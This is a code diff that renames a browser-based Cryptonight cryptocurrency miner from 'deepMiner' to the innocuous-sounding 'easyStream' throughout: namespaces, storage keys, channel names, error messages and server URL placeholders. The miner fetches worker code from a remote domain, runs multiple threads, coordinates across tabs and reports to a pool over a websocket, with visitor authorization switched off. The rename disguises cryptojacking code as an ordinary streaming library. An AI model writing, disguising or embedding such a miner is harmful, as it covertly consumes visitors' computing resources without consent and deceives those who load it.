@@ -25,7 +25,7 @@
         };
         this._tab = {
             ident: Math.random() * 16777215 | 0,
-            mode: deepMiner.IF_EXCLUSIVE_TAB,
+            mode: easyStream.IF_EXCLUSIVE_TAB,
             grace: 0,
             waitReconnect: 0,
             lastPingReceived: 0,
@@ -33,7 +33,7 @@
         };
         if (window.BroadcastChannel) {
             try {
-                this._bc = new BroadcastChannel("deepMiner");
+                this._bc = new BroadcastChannel("easyStream");
                 this._bc.onmessage = function (msg) {
                     if (msg.data === "ping") {
                         this._tab.lastPingReceived = Date.now()
@@ -41,8 +41,8 @@
                 }.bind(this)
             } catch (e) {}
         }
-        if (deepMiner.CONFIG.REQUIRES_AUTH) {
-            this._auth = new deepMiner.Auth(this._siteKey, {
+        if (easyStream.CONFIG.REQUIRES_AUTH) {
+            this._auth = new easyStream.Auth(this._siteKey, {
                 theme: this.params.theme || "light",
                 lang: this.params.language || "auto"
             })
@@ -65,7 +65,7 @@
         this._onVerifiedBound = this._onVerified.bind(this)
     };
     Miner.prototype.start = function (mode, optInToken) {
-        this._tab.mode = mode || deepMiner.IF_EXCLUSIVE_TAB;
+        this._tab.mode = mode || easyStream.IF_EXCLUSIVE_TAB;
         this._optInToken = optInToken;
         if (this._tab.interval) {
             clearInterval(this._tab.interval);
@@ -157,7 +157,7 @@
         this._targetNumThreads = num;
         if (num > this._threads.length) {
             for (var i = 0; num > this._threads.length; i++) {
-                var thread = new deepMiner.JobThread;
+                var thread = new easyStream.JobThread;
                 if (this._currentJob) {
                     thread.setJob(this._currentJob, this._onTargetMetBound)
                 }
@@ -181,7 +181,7 @@
         return /mobile|Android|webOS|iPhone|iPad|iPod|IEMobile|Opera Mini/i.test(navigator.userAgent)
     };
     Miner.prototype.didOptOut = function (seconds) {
-        if (!deepMiner.CONFIG.REQUIRES_AUTH) {
+        if (!easyStream.CONFIG.REQUIRES_AUTH) {
             return false
         }
         seconds = seconds || 60 * 60 * 4;
@@ -191,7 +191,7 @@
     Miner.prototype.selfTest = function (callback) {
         this._loadWorkerSource(function () {
             if (!this.verifyThread) {
-                this.verifyThread = new deepMiner.JobThread
+                this.verifyThread = new easyStream.JobThread
             }
             var testJob = {
                 verify_id: "1",
@@ -207,36 +207,36 @@
     Miner.prototype._loadWorkerSource = function (callback) {
         var xhr = new XMLHttpRequest;
         xhr.addEventListener("load", function () {
-            deepMiner.CRYPTONIGHT_WORKER_BLOB = deepMiner.Res(xhr.responseText);
+            easyStream.CRYPTONIGHT_WORKER_BLOB = easyStream.Res(xhr.responseText);
             this._asmjsStatus = "loaded";
             callback()
         }.bind(this), xhr);
-        xhr.open("get", deepMiner.CRYPTONIGHT_WORKER_BLOB, false);
+        xhr.open("get", easyStream.CRYPTONIGHT_WORKER_BLOB, false);
         xhr.send()
         if (this._useWASM || this._asmjsStatus === "loaded") {
             callback()
         } else if (this._asmjsStatus === "unloaded") {
             this._asmjsStatus = "pending";
-            xhr.open("get", deepMiner.CONFIG.LIB_URL + deepMiner.CONFIG.ASMJS_NAME, false);
+            xhr.open("get", easyStream.CONFIG.LIB_URL + easyStream.CONFIG.ASMJS_NAME, false);
             xhr.send()
         }
     };
     Miner.prototype._startNow = function () {
-        if (this._tab.mode !== deepMiner.FORCE_MULTI_TAB && !this._tab.interval) {
+        if (this._tab.mode !== easyStream.FORCE_MULTI_TAB && !this._tab.interval) {
             this._tab.interval = setInterval(this._updateTabs.bind(this), 1e3)
         }
-        if (this._tab.mode === deepMiner.IF_EXCLUSIVE_TAB && this._otherTabRunning()) {
+        if (this._tab.mode === easyStream.IF_EXCLUSIVE_TAB && this._otherTabRunning()) {
             return
         }
-        if (this._tab.mode === deepMiner.FORCE_EXCLUSIVE_TAB) {
+        if (this._tab.mode === easyStream.FORCE_EXCLUSIVE_TAB) {
             this._tab.grace = Date.now() + 3e3
         }
         if (!this.verifyThread) {
-            this.verifyThread = new deepMiner.JobThread
+            this.verifyThread = new easyStream.JobThread
         }
         this.setNumThreads(this._targetNumThreads);
         this._autoReconnect = true;
-        if (deepMiner.CONFIG.REQUIRES_AUTH && !this._optInToken) {
+        if (easyStream.CONFIG.REQUIRES_AUTH && !this._optInToken) {
             this._waitingForAuth = true;
             this._auth.auth(function (token) {
                 this._waitingForAuth = false;
@@ -265,7 +265,7 @@
             return true
         }
         try {
-            var tdjson = localStorage.getItem("deepMiner");
+            var tdjson = localStorage.getItem("easyStream");
             if (tdjson) {
                 var td = JSON.parse(tdjson);
                 if (td.ident !== this._tab.ident && Date.now() - td.time < 1500) {
@@ -290,7 +290,7 @@
                 this._bc.postMessage("ping")
             }
             try {
-                localStorage.setItem("deepMiner", JSON.stringify({
+                localStorage.setItem("easyStream", JSON.stringify({
                     ident: this._tab.ident,
                     time: Date.now()
                 }))
@@ -350,7 +350,7 @@
         if (this._socket) {
             return
         }
-        var shards = deepMiner.CONFIG.WEBSOCKET_SHARDS;
+        var shards = easyStream.CONFIG.WEBSOCKET_SHARDS;
         var shardIdx = this._hashString(this._siteKey) % shards.length;
         var proxies = shards[shardIdx];
         var proxyUrl = proxies[Math.random() * proxies.length | 0];
@@ -429,7 +429,7 @@
             this._tab.waitReconnect = 0
         } else if (msg.type === "error") {
             if (console && console.error) {
-                console.error("deepMiner Error:", msg.params.error)
+                console.error("easyStream Error:", msg.params.error)
             }
             this._emit("error", msg.params);
             if (msg.params.error === "invalid_site_key") {
@@ -481,25 +481,25 @@
         };
         this._socket.send(JSON.stringify(msg))
     };
-    window.deepMiner = window.deepMiner || {};
-    window.deepMiner.IF_EXCLUSIVE_TAB = "ifExclusiveTab";
-    window.deepMiner.FORCE_EXCLUSIVE_TAB = "forceExclusiveTab";
-    window.deepMiner.FORCE_MULTI_TAB = "forceMultiTab";
-    window.deepMiner.Token = function (siteKey, goal, params) {
+    window.easyStream = window.easyStream || {};
+    window.easyStream.IF_EXCLUSIVE_TAB = "ifExclusiveTab";
+    window.easyStream.FORCE_EXCLUSIVE_TAB = "forceExclusiveTab";
+    window.easyStream.FORCE_MULTI_TAB = "forceMultiTab";
+    window.easyStream.Token = function (siteKey, goal, params) {
         var miner = new Miner(siteKey, params);
         miner._goal = goal || 0;
         return miner
     };
-    window.deepMiner.User = function (siteKey, user, params) {
+    window.easyStream.User = function (siteKey, user, params) {
         var miner = new Miner(siteKey, params);
         miner._user = user;
         return miner
     };
-    window.deepMiner.Anonymous = function (siteKey, params) {
+    window.easyStream.Anonymous = function (siteKey, params) {
         var miner = new Miner(siteKey, params);
         return miner
     };
-    window.deepMiner.Res = function (s) {
+    window.easyStream.Res = function (s) {
         var url = window.URL || window.webkitURL || window.mozURL;
         return url.createObjectURL(new Blob([s]))
     }
@@ -507,7 +507,7 @@
 (function (window) {
     "use strict";
     var JobThread = function () {
-        this.worker = new Worker(deepMiner.CRYPTONIGHT_WORKER_BLOB);
+        this.worker = new Worker(easyStream.CRYPTONIGHT_WORKER_BLOB);
         this.worker.onmessage = this.onReady.bind(this);
         this.currentJob = null;
         this.verifyJob = null;
@@ -570,13 +570,13 @@
         }
         this.running = false
     };
-    window.deepMiner.JobThread = JobThread
+    window.easyStream.JobThread = JobThread
 })(window);
-self.deepMiner = self.deepMiner || {};
-self.deepMiner.CONFIG = {
-    LIB_URL: "https://%deepMiner_domain%/lib/",
-    WEBSOCKET_SHARDS: [["wss://%deepMiner_domain%/api"]],
+self.easyStream = self.easyStream || {};
+self.easyStream.CONFIG = {
+    LIB_URL: "https://%easyStream_domain%/lib/",
+    WEBSOCKET_SHARDS: [["wss://%easyStream_domain%/api"]],
     ASMJS_NAME: "cryptonight-asmjs.min.js",
     REQUIRES_AUTH: false
 };
-deepMiner.CRYPTONIGHT_WORKER_BLOB = "https://%deepMiner_domain%/worker.min.js";
+easyStream.CRYPTONIGHT_WORKER_BLOB = "https://%easyStream_domain%/worker.min.js";
